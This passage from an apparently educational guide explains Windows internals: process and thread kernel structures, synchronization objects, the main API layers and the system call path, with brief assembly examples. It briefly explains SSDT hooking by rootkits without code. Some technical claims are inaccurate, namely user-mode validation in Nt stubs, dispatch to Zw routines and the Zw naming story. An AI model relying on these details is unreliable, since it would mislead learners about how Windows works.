<li><code>_LARGE_INTEGER CreateTime</code>: The time the process was created.</li>
<li><code>_LIST_ENTRY SessionProcessLinks</code>: Links the current process into the logon-session wide process-list, which keeps track of all live (non-terminated) processes spawned within the same logon-session in a doubly-linked list.</li>
<li><code>_PEB* Peb</code>: A pointer to a user-mode data structure, which contains data about environment variables, loaded modules, command-line arguments, and other usefule information that the application can access directly.</li>
<li><code>_HANDLE_TABLE* ObjectTable</code>: A pointer to the process's Process Handle Table.</li>
<li><code>VOID* DebugPort</code>: A pointer used to track whether a process is being debugged, and if so which kernel debugging object it is attached to.</li>
<li><code>_FILE_OBJECT* ImageFilePointer</code>: A pointer to the kernel FILE_OBJECT for the executable image.</li>
<li><code>UCHAR ImageFileName[15]</code>: The executable's filename.</li>
<li><code>_LIST_ENTRY ThreadListHead</code>: The head of the linked list containing all <code>_ETHREAD</code> objects belonging to this process.</li>
<li><code>volatile ULONG ActiveThreads</code>: The total number of running threads.</li>
<li><code>_LARGE_INTEGER [...]OperationCount</code>: The total number of (read/write/other) I/O operations.</li>
<li><code>_RTL_AVL_TREE VadRoot</code>: The root of the VAD Tree.</li>
<li><code>_PS_PROTECTION Protection</code>: The protection level of the process (more on this later)</li>
<li><code>_PROCESS_EXECUTION Execution</code>: The execution-state hub of <code>_EPROCESS</code> that informs the kernel whether the process may run, how long it has run, whether it is currently frozen, and whether special execution‑related attributes (debugged, protected, etc.) apply.</li>
</ul>
<p>In reality, the <code>_EPROCESS</code> object is much larger, but this truncated version covers the details that are most important to us currently.</p>
<h3 id="a-low-level-look-at-thread-objects"><a class="header" href="#a-low-level-look-at-thread-objects">A Low-Level Look at Thread Objects</a></h3>
<p>One such detail is the <code>_LIST_ENTRY ThreadListHead</code> attribute, which is the head of a circular doubly-linked list of <code>_ETHREAD</code> kernel objects belonging to the process. This object takes on the following form:</p>
<pre><code class="language-C">typedef struct _ETHREAD {
    struct _KTHREAD Tcb;
    union _LARGE_INTEGER CreateTime;
    union {
        struct _KSEMAPHORE KeyedWaitSemaphore;
        struct _KSEMAPHORE AlpcWaitSemaphore;
    };
    VOID* Win32StartAddress;
    struct _LIST_ENTRY ThreadListEntry;
    struct _CONTEXT* SetContextState;
} ETHREAD, *PETHREAD;
</code></pre>
<p>Here is a breakdown of what's happening:</p>
<ul>
<li>
<p><code>_KTHREAD Tcb</code>: The Kernel Thread Block, which is a low-level scheduling block containing priority, scheduler information, and the saved register state.</p>
</li>
<li>
<p><code>_LARGE_INTEGER CreateTime</code>: The time the thread was created.</p>
</li>
<li>
<p><code>_KSEMAPHORE [...]WaitSemaphore</code>: Part of a Union for specialized waiting mechanisms (Keyed Events and Advanced Local Procedure Call Semaphores).</p>
</li>
<li>
<p><code>VOID* Win32StartAddress</code>: Address of the thread’s start routine as supplied by the creating process (e.g., the function passed to <code>CreateThread</code> or the entry point of a newly created process).</p>
</li>
<li>
<p><code>_LIST_ENTRY ThreadListEntry</code>: allows the thread object to be linked into various kernel‑maintained thread lists.</p>
</li>
<li>
<p><code>_CONTEXT* SetContextState</code>: Pointer to the <code>CONTEXT</code> structure used to save/restore the thread's state during context switching (e.g., suspension, context switch, APC delivery)</p>
<div id="admonition-note-6" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-6-title">
<div class="admonition-title">
<div id="admonition-note-6-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-6"></a>
</div>
<div>
<p>To see what is saved as part of <code>CONTEXT</code>, take a look at the full object, <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_CONTEXT">here</a>.</p>
</div>
</div>
</li>
</ul>
<h2 id="synchronization-objects"><a class="header" href="#synchronization-objects">Synchronization Objects</a></h2>
<p>Without a way to coordinate resource access amongst multiple threads, a system may be vulnerable to race conditions and data corruption. A <strong>Synchronization Object</strong> is a kernel object designed to help threads coordinate access to shared resources. There are 4 primary types:</p>
<ul>
<li><code>Mutexes</code>(<strong>Mutual Exclusions</strong>): A resource obtained to gain access to a shared resource, which can only be obtained by one thread at a time.
<ul>
<li>In practice, a thread will attempt to acquire the mutex for some shared resource. If it is already owned, the thread waits in a queue until the owning thread releases ownership.</li>
</ul>
</li>
<li><code>Events</code>: A type of synchronization object that can be set to either a signaled (<code>True</code>) state or a non-signaled (<code>False</code>) state.
<ul>
<li>In practice, a thread can wait on an event, which will cause it to pause until another thread sets the event to the signaled state.</li>
</ul>
</li>
<li><code>Semaphores</code>: A type of synchronization object that allows multiple threads to access a shared resource at a time. It maintains a counter which decrements when a thread acquires access to the resource and increments when a thread relinquishes access to the resource.
<ul>
<li>A semaphore with a maximum count of one is functionally the same as a mutex.</li>
<li>Once the count is 0, a thread requesting the protected resource will enter a wait state until the semaphore count is &gt;=1.</li>
</ul>
</li>
<li><code>Critical Sections</code>: A simplified, user-mode version of a mutex.
<ul>
<li>In practice, they are faster than a mutex because they do not require a switch to kernel-mode unless the resource is contested.</li>
</ul>
</li>
</ul>
<h2 id="the-process-initialization-sequence"><a class="header" href="#the-process-initialization-sequence">The Process Initialization Sequence</a></h2>
<p>The creation of a new process involves a series of steps to set up its virtual address space and load the necessary code. It generally operates as follows:</p>
<ol>
<li><strong>Create Address Space</strong>: Creates a new, fundamental, and isolated virtual address space for the new process. This is the first thing to happen after a process calls <code>CreateProcess</code>.</li>
<li><strong>Load <code>NTDLL.DLL</code></strong>: <code>CreateProcess</code> maps <code>NTDLL.DLL</code>, the operating system's core library, into the newly created address space, along with the main executable (<code>.exe</code>) file.</li>
<li><strong>Create Primary Thread</strong>: <code>CreateProcess</code> creates the process's first thread and allocates stack space for it.</li>
<li><strong>Execute <code>LdprInitialize</code></strong>: When the primary thread begins execution, it calls the <code>LdrpInitialize</code> from <code>NTDLL.DLL</code>.
<ul>
<li><code>LDRPInitialize</code>: (<strong>LoaDeR Private</strong>) Used to prepare a program to run by loading and initializing various components.</li>
</ul>
</li>
<li><strong>Load Dependencies</strong>: <code>LdrpInitialize</code> recursively traverses the import tables of the primary executable and its loaded DLLs, then maps all required DLLs into the process's virtual address space.</li>
<li><strong>Call Initialization Routines</strong>:Control is passed to <code>LdrpRunInitializeRoutines</code>
<ul>
<li><code>LdrpRunInitializeRoutines</code>: initializes all static DLLs, which are currently loaded into the address space.</li>
<li>The initialization process consists of calling each DLL's entry point with the <code>DLL_PROCESS_ATTACH</code> constant set for <code>DWORD fdwReason</code> (more on this in <code>Malware Essentials</code>)</li>
</ul>
</li>
<li><strong>Transfer to Executable's Entry Point</strong>: Once all the DLLs are initialized, <code>LdrpInitialize</code> calls the thread's initialization process, which is the <code>BaseProcessorStart</code> function from <code>kernel32.dll</code>
<ul>
<li><code>kernel32.dll</code> calls the primary executable's <code>WinMain</code> entry point, completing the initialization process.</li>
</ul>
</li>
</ol>
<h2 id="application-programming-interfaces"><a class="header" href="#application-programming-interfaces">Application Programming Interfaces</a></h2>
<p>An <strong>Application Programming Interface</strong> (<code>API</code>) is a set of functions that the operating system makes available to application programs for communicating with the operating system. Here, we will review 3 APIs that are crucial to facilitating normal operations on modern Windows devices, <code>Win32</code>, <code>DirectX</code>, and <code>WinRt</code>.</p>
<h3 id="the-win32-api"><a class="header" href="#the-win32-api">The Win32 API</a></h3>
<p>The <code>Win32</code> API is the high-level, documented, and officially supported API that most application programmers use at some level. It is a very large set of functions that make up the official, low-level programming interface for Windows applications. It provides access to the features of Windows, including memory management, process and thread management, and GUI operations.</p>
<p>Typically, <code>Win32</code> is not used directly by programmers anymore, as simpler, higher-level interfaces have been developed that expose most of the features offered by the <code>Win32</code> API, such as:</p>
<ul>
<li><code>Microsoft Foundation Classes</code>(Legacy)(<strong>MFC</strong>): An object oriented wrapper over the <code>Win32</code> API implemented in C++. It simplifies GUI and message handling for native apps.</li>
<li><code>.NET Framework</code>: A managed framework with access to Windows Functionality via <code>P/Invoke</code> or <code>COM Interop</code>. Uses the <code>System</code> class for accessing operating system services.
<ul>
<li><code>System</code> is an interface into the <code>Win32</code> API.</li>
</ul>
</li>
</ul>
<p>Applications that use <code>Win32</code> are generally portable across different versions of Windows. We have reviewed a few functions in this API, including <code>CreateProcess</code>, <code>WriteProcessMemory</code>, and <code>VirtualAlloc</code>. Others include:</p>
<ul>
<li><code>LoadLibrary</code>: Maps a library into the virtual memory space of a process.</li>
<li><code>GetProcAddress</code>: Looks up the virtual address of a particular function within a loaded library/module.</li>
<li><code>GetModuleHandle</code>: retrieves a handle (<code>HMODULE</code>) to a module that is already loaded in the calling process’s address space.</li>
</ul>
<p>Most higher-level interfaces an application will employ use <code>Win32</code> for communicating with the Operating System. Some applications will use the low-level <code>Native</code> API, but this is rare.</p>
<p>There are thousands of APIs within the Core Win32 API, divided into many categories:</p>
<div class="table-wrapper"><table><thead><tr><th>Library/Subsystem</th><th>Approx. # of Functions</th></tr></thead><tbody>
<tr><td><code>kernel32.dll</code>: system core, memory, threads, files</td><td>~700-800</td></tr>
<tr><td><code>user32.dll</code>: windows, messages, UI controls</td><td>~500-600</td></tr>
<tr><td><code>gdi32.dll</code>: graphics</td><td>~400-500</td></tr>
<tr><td><code>advapi32.dll</code>: security, registry, services</td><td>~300-400</td></tr>
<tr><td><code>comdlg32.dll</code>: Common Dialogs</td><td>~100-200</td></tr>
<tr><td><code>shell32.dll</code>: shell, file operations</td><td>~300-400</td></tr>
<tr><td><code>ole32.dll</code>: COM runtime helpers, Marshaling</td><td>~200-300</td></tr>
</tbody></table>
</div>
<p>We will focus on 3 of these: <code>User</code>, <code>Kernel</code>, and <code>GDI</code>.</p>
<h4 id="kernel-apis"><a class="header" href="#kernel-apis">Kernel APIs</a></h4>
<p><code>Kernel</code> APIs are implemented in the <code>kernel32.dll</code> module and they include all non-GUI related services, such as file I/O, memory management, object management, process and thread management, etc.</p>
<p>Kernel APIs are used for creating and working with Kernel-level objects such as files, synchronization objects, etc. which are implemented in the systems object manager. <code>kernel32.dll</code> typically calls low-level Native APIs from <code>ntdll.dll</code> to implement various services, such as:</p>
<ul>
<li><strong>File Management</strong>: <code>CreateFile()</code></li>
<li><strong>Process Management</strong>: <code>CreateProcess()</code></li>
<li><strong>Memory Management</strong>: <code>VirtualAllocEx()</code></li>
<li><strong>Security &amp; Access Control</strong>: <code>GetTokenInformation()</code></li>
<li><strong>Miscellaneous</strong>: <code>GetEnvironmentVariable()</code></li>
</ul>
<h4 id="gdi-apis"><a class="header" href="#gdi-apis">GDI APIs</a></h4>
<p><code>GDI</code> APIs are implemented in the <code>gdi32.dll</code> module. They include low-level 2D graphics services such as:</p>
<ul>
<li><strong>Drawing a line</strong>: <code>LineTo()</code></li>
<li><strong>Displaying a Bitmap</strong>: <code>CreateBitmap()</code></li>
<li><strong>Creates/Ends Print Jobs</strong>: <code>StartDoc()</code>/<code>EndDoc()</code></li>
<li><strong>Device Contexts</strong>: <code>CreateDC()</code></li>
<li><strong>Brushes</strong>: <code>CreateSolidBrush()</code></li>
<li><strong>Pens</strong>: <code>CreatePen()</code></li>
</ul>
<p>The objects are managed by <code>win32k.sys</code> object managers, not the main kernel object manager.</p>
<div id="admonition-note-7" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-7-title">
<div class="admonition-title">
<div id="admonition-note-7-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-7"></a>
</div>
<div>
<p><code>win32k.sys</code> is a critical system driver responsible for managing core graphical and user interface functions for legacy programs. It can generally be found at: <code>C:\Windows\System32\drivers\win32k.sys</code></p>
<p>It is part of a larger family of <code>win32k</code> API's which made the function of the <code>win32k.sys</code> driver modular in Windows 10+. Other members of this family include:
<code>win32kbase.sys</code>: The base driver where all GDI requests are sent to. Capable of handling basic window management and input tasks.
<code>win32kfull.sys</code>: The full implementation of the GDI code base. Handles tasks that cannot be completed by <code>win32kbase.sys</code> alone, such as font rasterization, print rendering, and complex drawing.</p>
<p>They can be found at <code>C:\Windows\System32\win32kbase.sys</code> and <code>C:\Windows\System32\win32kfull.sys</code> respectively.</p>
</div>
</div>
<h4 id="user-apis"><a class="header" href="#user-apis">User APIs</a></h4>
<p><code>User</code> APIs are implemented in the <code>user32.dll</code> module and include all higher-level GUI-related services such as:</p>
<ul>
<li><strong>Window Management</strong>: <code>CreateWindow()</code></li>
<li><strong>Menus</strong>: <code>CreatePopupMenu()</code></li>
<li><strong>Dialog Boxes</strong>: <code>CreateDialogParam()</code></li>
<li><strong>UI Controls</strong>: <code>SetScrollInfo()</code></li>
</ul>
<div id="admonition-note-8" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-8-title">
<div class="admonition-title">
<div id="admonition-note-8-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-8"></a>
</div>
<div>
<p>All GUI objects are drawn by <code>USER</code> APIs using <code>GDI</code> API calls to perform the actual drawing.</p>
</div>
</div>
<div id="admonition-note-9" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-9-title">
<div class="admonition-title">
<div id="admonition-note-9-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-9"></a>
</div>
<div>
<p>On modern systems, while the <code>Win32k</code> family is used to handle basic 2D-rendering tasks, other APIs have taken on much of its responsibility. For instance, the DirectX API is used for more graphically intensive tasks.</p>
</div>
</div>
<h4 id="the-api-call-sequence"><a class="header" href="#the-api-call-sequence">The API Call Sequence</a></h4>
<p>When a user-mode application makes a <code>Win32</code> API call, a sequence of events occur to get the request to the kernel:</p>
<ol>
<li>An application module makes a call to a function in a <code>Win32</code> DLL (i.e., <code>kernel32.dll</code>, <code>user32.dll</code>, <code>gdi32.dll</code>)</li>
<li>The Win32 DLL then calls the corresponding function in the Native API interface, <code>ntdll.dll</code></li>
<li><code>ntdll.dll</code> uses a low-level instruction, such as a <code>syscall</code> to transition from user-mode to kernel-mode</li>
<li>The kernel then runs a service dispatch routine that looks up the requested function in the <code>ntoskrnl.exe</code> or <code>win32k.sys</code> service dispatch table and executes the corresponding kernel-mode code.</li>
</ol>
<p><img src="https://hackmd.io/_uploads/Sy9mcJtAxe.png" alt="image" /></p>
<blockquote>
<p>Diagram of <code>Win32</code> APIs relative to the Windows Kernel, <code>ntoskrnl.exe</code></p>
</blockquote>
<h3 id="the-directx-api"><a class="header" href="#the-directx-api">The DirectX API</a></h3>
<p>The <code>DirectX</code> API is a set of high-performance, low-level APIs specifically designed for gaming and multimedia applications. It provides tools for high-fidelity graphics and audio rendering. <code>DirectX</code> is a specialized API suite that is distinct from the general-purpose <code>Win32</code> API (specifically from <code>user32.dll</code> and <code>gdi32.dll</code>) as it provides a more direct path for applications to communicate with the GPU and sound hardware and abstracts the complexities of different hardware architectures, allowing developers to write code that works across a wide range of video and sound cards.</p>
<p>Some of the key APIs within <code>DirectX</code> are:</p>
<ul>
<li><code>Direct3D</code>: The API used for rendering 3D graphics.
<ul>
<li><code>Direct3D</code> provides a low-level interface to the graphics hardware, giving developers explicit control over the GPU pipeline for maximum performance.</li>
<li><strong>Key Concepts</strong>
<ul>
<li><code>Device Cteation</code>: Functions like <code>D3D12CreateDevice</code> are used to initialize the graphics device and get a handle to the GPU, setting the stage for all subsequent rendering operations.</li>
<li><code>Resource Management</code>: Direct3D manages various resources, such as vertex buffers (to store 3D model geometry) and textures (to apply images to surfaces).
<ul>
<li>Ex: <code>ID3D12GraphicsCommandList::IASetVertexBuffers()</code> is a function used to bind geometry data to the rendering pipeline</li>
</ul>
</li>
<li><code>Drawing Commands</code>: The core of Direct3D is its ability to issue drawing commands.</li>
</ul>
</li>
<li><code>Direct3D</code> can be found at <code>C:\Windows\System32\d3d12.dll</code> (previously <code>d3d11.dll</code> and <code>d3d9.dll</code>)</li>
</ul>
</li>
<li><code>Direct 2D</code>: The API for high-performance, hardware-accelerated 2D graphics.
<ul>
<li><code>Direct2D</code> is an evolution of <code>GDI</code>, designed for modern applications that need to render high-quality, scalable 2D content efficiently.</li>
<li><strong>Key Concepts</strong>
<ul>
<li><code>Factory Creation</code>: The first step in using <code>Direct2D</code> is to create a factory, using functions like <code>D2D1CreateFactory</code>. The <code>factory</code> is the starting point for creating all other <code>Direct2D</code> resources.</li>
<li><code>Render Target</code>: The <code>ID2D1HwndRenderTarget</code> interface represents the surface you want do draw on, such as a window. You use a function like <code>ID2D1Factory::CreateHwndRenderTarget()</code> to create it.</li>
<li><code>Drawing Operations</code>: Once a render target is created, yo ucan use its methods to draw. <code>ID2D1HwndRenderTarget::DrawRectange()</code> is a single example for rendering a rectangle.</li>
</ul>
</li>
<li><code>Direct2D</code> can be found at <code>C:\Windows\System32\d2d1.dll</code></li>
</ul>
</li>
<li><code>DirectWrite</code>: The API for High-Quality test rendering, designed to work seamlessly with Direct3D and Direct2D.
<ul>
<li><code>DirectWrite</code> provides advanced features for text layout, font management, and glyph rendering.</li>
<li><code>Key Concepts</code>
<ul>
<li><code>Text Formatting</code>: <code>DirectWrite</code> allows you to define the format of text. A function like <code>IDWriteTextFormat()</code> lets you specify the font, size, and style.</li>
<li><code>Text Layout</code>: To arrange text on the screen, you use a text layout object. The <code>IDWriteTextLayout</code> interface allows you to specify a text string and a format, and it handles the layout. This is crucial for handling complex scripts, wrapping text, and aligning content.</li>
<li><code>Rendering</code>: While <code>DirectWrite</code> handles the layout, the actual rendering is often done within <code>Direct2D</code>. You pass the text layout to a <code>Direct2D</code> drawing function to render it to the screen with hardware acceleration.</li>
</ul>
</li>
<li><code>Direct3D</code> can be found at <code>C:\Windows\System32\dwrite.dll</code></li>
</ul>
</li>
</ul>
<h4 id="the-api-call-sequence-1"><a class="header" href="#the-api-call-sequence-1">The API Call Sequence</a></h4>
<p>WHen a user-mode application makes a <code>DirectX</code> API call, a sequence of events occurs to get the request to the kernel and eventually, the GPU:</p>
<ol>
<li>A user-mode app makes a call to a <code>DirectX</code> API (<code>d3d12.dll</code>, <code>d2d1.dll</code>, <code>dwrite.dll</code>, etc.)</li>
<li>The <code>DirectX</code> API prepares the necessary data and commands in user mode. It then makes a system call to the kernel</li>
<li>The system call enters the kernel and is handled by the <code>DirectX</code> Graphics Kernel Subsystem <code>dxgkrnl.sys</code>
<ul>
<li><code>ntoskrnl.exe</code> receives the <code>syscall</code>, looks up the service number in it's dispatch table, then immediately hands off the request to <code>dxgkrnl.sys</code></li>
<li><code>dxgkrnl.sys</code> handles all GP-related tasks, but will make its own direct function calls to <code>ntoskrnl.exe</code> for foundational services, such as allocating memory in kernel space for GPU resources.</li>
</ul>
</li>
<li><code>dxgkrnl.sys</code> handles the core management tasks, such as scheduling GP work, allocating video memory (<code>VRAM</code>) and providing security and isolation.</li>
<li><code>dxgkrnl.sys</code> then passes the prepared commands to the hardware specific graphics driver (i.e., <code>nvlddmkm.sys</code> for nvidia). This driver is another kernel-mode component.</li>
<li>The hardware specific driver translates the commands into a format the GPU can understand and sends them directly to the GPU hardware.</li>
</ol>
<h3 id="the-windows-runtime-winrt-api"><a class="header" href="#the-windows-runtime-winrt-api">The Windows Runtime (WinRT) API</a></h3>
<p><code>Windows Runtime</code>(<strong>WinRT</strong>) is the modern, class-based API set created to be the foundation of the Universal WIndows Platform (<strong>UWP</strong>). It is designed to provide a secure, modern and language agnostic way for developers to build applications for a variety of Windows devices and built on the principles of the Component Object Model (<strong>COM</strong>)</p>
<p><code>WinRT</code> can be modeled by 4 layers:</p>
<ol>
<li><strong>The Metadata Layer</strong>: Binary metadata files that serve as a blueprint, containing a complete description of all the <code>WinRT</code> APIs, including their classes, methods, and properties.</li>
<li><strong>The Language Protection Layer</strong>: Enables the language agnostic nature of WinRT. A language's runtime (i.e., <code>C++/WinRT</code> Libraries) read the <code>.winmd</code> files and automatically generate "proxy" code, which translates the developers calls in their chosen language into low-level <strong>COM</strong> calls.</li>
<li><strong>The WinRT Implementation Layer</strong>: Contains the actual executable code, which is provided by Windows itself and located in user-mode DLLs (i.e., <code>Windows.Globalization.dll</code>)</li>
<li><strong>The Kernel Layer</strong>: When a <code>WinRT</code> API call requires a privileged operation, the <code>WinRT</code> implementation in user-mode makes a system call to the Windows kernel. The communication to the kernel is handled via the Native API interface (<code>ntdll.dll</code>)</li>
</ol>
<p>A few examples of <code>WinRT</code> APIs include:</p>
<ul>
<li><code>Windows.UI.Xaml.Controls.Button</code>: Creates a button in a modern UI. Code is run by <code>Windows.UI.XAML.dll</code></li>
<li><code>Windows.Web.HTTP.HttpClient</code>: Makes HTTP requests over the network. Code run by <code>Windows.Web.Http.dll</code></li>
<li><code>Windows.Devices.Geolocation.Geoloader</code>: Used to get location data from a devices GPS or other sensors. Code run by <code>WIndows.Devices.dll</code></li>
</ul>
<p>The system file we have discussed, including the core DLLs and drivers, are generally located in <code>C:\Windows\System32</code> on a standard Windows installation</p>
<h2 id="the-native-api"><a class="header" href="#the-native-api">The Native API</a></h2>
<p>The <code>Native</code> API is the low-level interface to the Windows kernel. <code>C:\Windows\System32\ntdll.dll</code> is an interface for the API and <code>C:\Windows\System32\ntoskrnl.exe</code> is the actual implementation in kernel-mode. Most high-level <code>Win32</code>, <code>DirectX</code>, and <code>WinRt</code> APIs serve as documented wrappers around these <code>Native</code> API functions. APIs in the <code>Native</code> API always start with one of two prefixes: <code>Nt</code> or <code>Zw</code>.</p>
<h3 id="the-nt-apis-ntxxx"><a class="header" href="#the-nt-apis-ntxxx">The NT APIs (<code>NtXxx</code>)</a></h3>
<p><code>Nt</code> is short for <strong>New Technology</strong>. APIs with this prefix are located in <code>ntdll.dll</code>, a user-mode library. By default, user-mode applications are considered untrusted, so <code>Nt</code> functions perform extensive parameter validation before transitioning into the kernel. They check for valid memory addresses, proper data types, and sufficient permissions. This is a critical security measure to prevent a user-mode program from passing a malicious or invalid value that could cause a crash in the privileged kernel space. If an invalid call is made, the call will fail gracefully, returning an error code, not causing a system crash.</p>
<p>For example: A user-mode program calls <code>NtCreateFile</code> fro <code>ntdll.dll</code>.</p>
<ol>
<li>The function validates the path to the file, the permissions and other parameters.</li>
<li>If the path is invalid the function returns an error, without ever entering the kernel.</li>
<li>If the parameters are valid, the function prepares a <code>syscall</code> to the kernel.</li>
</ol>
<h3 id="the-zw-api-zwxxx"><a class="header" href="#the-zw-api-zwxxx">The ZW API (<code>ZwXxx</code>)</a></h3>
<p><code>Zw</code> is rumored to be named after Gary Zwicky, a former Microsoft Engineer. These functions are located and implemented within the kernel-mode file, <code>ntoskrnl.exe</code>. The <code>Zw</code> API is designed to be called by kernel-mode components, primarily device drivers. <code>Zw</code> functions are considered trusted. They assume that the caller has already validated the parameters. For performance reasons, they do not perform a second round of validation. A call from a kernel-mode driver with ain invalid pointer or corrupted data can lead to a severe error, often resulting in a <strong>Blue Screen of Death</strong> (BSOD).</p>
<p>For example: A device driver needs to vreate a file</p>
<ol>
<li>Since the kernel-mode code is trusted, the driver calls <code>ZwCreateFile</code> directly.</li>
<li>If there is an error, it is handled ungracefully, likely resulting in BSOD.</li>
<li>If the parameters are valid, <code>ZwCreateFile</code> executes without issue, and allows access to the file from a given address.</li>
</ol>
<h3 id="the-link-between-nt-and-zw"><a class="header" href="#the-link-between-nt-and-zw">The Link Between <code>Nt</code> and <code>Zw</code></a></h3>
<p>When a user-mode application calls an <code>Nt</code> function, a few things occur:</p>
<ol>
<li>The <code>Nt</code> function performs its validation checks in user-mode.</li>
<li>It loads the system call number and parameters into the appropriate registers.</li>
<li>It executes the system call instruction, which transfers control to the kernel.</li>
<li>The kernel's <strong>System Service Dispather</strong> receives the system call and routes the request to the corresponding kernel-mode routine.</li>
<li>The kernel-mode routine is, in many cases, the <code>Zw</code> version of the function. For example, a <code>syscall</code> for <code>NtCreateFile</code> is dispatched to the core <code>ZwCreateFile</code> routine in <code>ntoskrnl.exe</code>.</li>
</ol>
<h2 id="the-system-calling-mechanism"><a class="header" href="#the-system-calling-mechanism">The System Calling Mechanism</a></h2>
<p>A <strong>system call</strong> is the process by which a user-mode thread requests a service from the operating system kernel. The user-mode side prepares the request by setting up registers according to a specific calling convention. A special instruction (<code>syscall</code> or <code>int 0x2e</code>) then triggers a direct, privileged transition into kernel-mode.</p>
<h3 id="the-64-bit-system-call-process"><a class="header" href="#the-64-bit-system-call-process">The 64-bit System Call Process</a></h3>
<ol>
<li><strong>Loading the System Call Number</strong>: A number representing the specific service requested from the kernel is loaded into the <code>rax</code> register.</li>
<li><strong>Passing the Parameters</strong>: The parameters for the system call are passed to the kernel using registers:
<ul>
<li><strong>1st Parameter</strong>: <code>rcx</code></li>
<li><strong>2nd</strong>: <code>rdx</code></li>
<li><strong>3rd</strong>: <code>r8</code></li>
<li><strong>4th</strong>: <code>r9</code></li>
<li>Additional parameters are pushed onto the <code>stack</code></li>
</ul>
</li>
<li><code>syscall</code>: Once the registers are populated, the <code>syscall</code> instruction is executed.</li>
<li><strong>Execution to Kernel Mode</strong>: The <code>syscall</code> instruction causes the CPU to trap into kernel mode at a pre-defined entry point. The kernel then uses the system call number in <code>rax</code> to lookup the correct handler function in the <strong>System Service Dispatch Table</strong>. 5) <strong>Execution and Return</strong>: The kernel-mode handler executes the requested service. Upon completion, the kernel restores the user-mode state and uses the <code>ret</code> instruction to return control to the user-mode application.</li>
</ol>
<pre><code class="language-asm64">; 64-bit Intel Assembly
mov rax, 0x1A            ; System Call number for `NtClose` is 0x1A
mov rcx, &lt;Handle&gt;        ; First parameter (handle) is in `rcx`
syscall                  ; Execute the system call
ret                      ; Return from the function
</code></pre>
<h3 id="the-32-bit-system-call-process"><a class="header" href="#the-32-bit-system-call-process">The 32-bit System Call Process</a></h3>
<ol>
<li><strong>Loading the System Call Number</strong>: The system call number is saved to <code>eax</code>.</li>
<li><strong>Passing the Parameters</strong>: The parameters for the function are passed onto the stack. The caller is responsible for pushing the parameters reverse order (right to left).</li>
<li><code>int 0x2e</code>: The system call instruction is called by generating a software interrupt, causing an immediate, privileged transition from the user-mode execution context into the kernel-mode interrupt handler.</li>
<li><strong>Transition to Kernel Mode</strong>: When the <code>int 0x2e</code> instruction is executed, the CPUs <strong>Interrupt Descriptor Table</strong> is used to find the corresponding kernel-mode interrupt handler for interrupt <code>0x2e</code>. The handler takes control, then uses the value in <code>eax</code> to identify the requested service. The handler then reads the parameters from the user-mode stack. The requested kernel function is executed with the provided parameters.</li>
<li><strong>Execution and Return</strong>: Once the operation is complete, the kernel restores the user-mode context and returns control to the application, often via a <code>ret</code> instruction.</li>
</ol>
<pre><code class="language-asm32">; 32-bit Intel Assembly
push eax            ; save reister value
push [esp+8]        ; Push the handle to the stack
mov eax, 0x12       ; System call number for NtClose is 0x12
int 0x2e            ; execute the system call
pop eax             ; restore the register
ret 4
</code></pre>
<h3 id="win32-api-as-a-wrapper"><a class="header" href="#win32-api-as-a-wrapper">Win32 API as a Wrapper</a></h3>
<p>The user-facing <code>Win32</code> AP wraps low-level calls. For instance, the <code>CloseHandle</code> function from <code>kernel32.dll</code> is implemented by making a call to <code>ntdll.dll</code>, which then executes the system call.</p>
<pre><code class="language-asm64">; Disassembly of CloseHandle in kernel32.dll
; CloseHandle(Handle hObject)
lea r11, [rip+&lt;some_offset&gt;]    ; Get a pointer to the NtClose stub in nt.dll
jmp r11                         ; Jump to the NtClose function
</code></pre>
<h3 id="the-kisystemservice-function"><a class="header" href="#the-kisystemservice-function">The <code>KiSystemService()</code> Function</a></h3>
<p><code>KiSystemService</code> is the single, privileged entry point into the Windows kernel for all user-mode system call requests. It is a highly optimized internal kernel function that is executed immediately after the <code>syscall</code> instruction is issued by the CPU. It is primarily used as the secure gatekeeper between user-mode and kernel-mode. When a <code>syscall</code> occurs, the CPU's privilege level is raised, and execution is transferred to <code>KiSystemService</code>, which will retrieve the system call number and parameters from the registers/stack, save the user execution context and set up the kernel context, and use the system call number to look up the execution function from <code>KiServiceTable</code>.</p>
<div id="admonition-note-10" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-10-title">
<div class="admonition-title">
<div id="admonition-note-10-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Windows.html#admonition-note-10"></a>
</div>
<div>
<p><strong>KiServiceTable</strong>
<strong>Ki</strong> stands for "kernel internal". <code>KiServiceTable</code> is an array of function pointers responsible for mapping a system call number to the memory address of the corresponding kernel function. This is also referred to as the <code>SystemServiceDispatchTable</code>.</p>
<p>The <code>KiServiceTable</code> is a acmomon target for malware and rootkids. By modifying a pointer in this table, an attacker can "hook" a system call, redirecting it to their own malicious code. This is referred to as <strong>System Service Dispatch Table Hooking</strong> (SSDT Hooking).</p>
</div>
</div>
<h3 id="the-system-call-dispatch-process"><a class="header" href="#the-system-call-dispatch-process">The System Call Dispatch Process</a></h3>
<p>The System Call Dispatch Process can be broken into 10 steps:</p>
<ol>
<li>A user-mode application calls a function (i.e., <code>NtClose</code>), which requires interaction with kernel-mode components. The <code>ntdll.dll</code> library handles this call.</li>
<li><code>ntdll.dll</code> places the system call number for the function (i.e., <code>0x1A</code> for <code>NtClose</code>) into the <code>rax</code> register and the function's other parameters into their respective registers/stack positions.</li>
<li>The <code>syscall</code> instruction is executed.</li>
<li>The CPU transitions to kernel-mode and begins executing the code for <code>KiSystemService</code>.</li>
<li><code>KiSystemService</code> reads the value from <code>rax</code>.</li>
<li><code>KiSystemService</code> uses the value in <code>rax (i.e., </code>0x1A<code>) as an index into the </code>KiServiceTable`.</li>
<li>The entry at <code>KiServiceTable[rax]</code> contains a pointer to the appropriate function. For example, <code>KiServiceTable[0x1A]</code> contains a pointer to <code>ZwClose</code>.</li>
<li><code>KiSystemService</code> jumps to the memory address stored in that table entry, transferring execution to the <code>ZwClose</code>. function.</li>
<li>The kernel function executes, performs the requested operation on kernel memory, and returns to <code>KiSystemService</code>.</li>
<li><code>KiSystemService</code> handles the cleanup and returns control securely to the user-mode application.</li>
</ol>
